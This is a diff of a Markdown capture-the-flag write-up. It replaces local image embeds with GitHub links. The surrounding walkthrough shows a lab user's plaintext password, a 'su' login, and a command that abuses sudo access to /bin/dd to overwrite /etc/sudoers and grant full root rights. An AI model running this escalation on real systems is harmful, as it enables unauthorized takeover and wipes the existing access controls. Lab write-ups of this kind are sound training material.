@@ -115,8 +115,7 @@ select * from users;*
 ```bash
 find / -user luisillo 2>/dev/null
 ```
-
-![[Pasted image 20250131114956.png]]
+![Pasted image 20250131114956](https://github.com/user-attachments/assets/4511c51b-3b53-4cdc-a189-c8ce83c79816)
 
 user:         luisillo
 passwd:    luisillosuperpassword
@@ -124,17 +123,15 @@ passwd:    luisillosuperpassword
 ```bash
 su luisillo
 ```
-![[Pasted image 20250131115121.png]]
+![Pasted image 20250131115121](https://github.com/user-attachments/assets/43a3547b-4d99-40fa-8105-08315f4f01c2)
 
 ```bash
 sudo -l
 ```
-![[Pasted image 20250131115147.png]]
-![[Pasted image 20250131115327.png]]
+![Pasted image 20250131115147](https://github.com/user-attachments/assets/86ee1c6f-094a-4717-8f59-1535f86d35f7)
+![Pasted image 20250131115327](https://github.com/user-attachments/assets/d8653740-eae7-41bc-aa20-d964b86e0e21)
 
 ```bash
 echo "luisillo ALL=(ALL:ALL) ALL" | sudo /bin/dd of=/etc/sudoers
 ```
-
-![[Pasted image 20250131115656.png]]
-
+![Pasted image 20250131115656](https://github.com/user-attachments/assets/dd6bcc69-a94a-4ea7-b57a-7138764a805e)
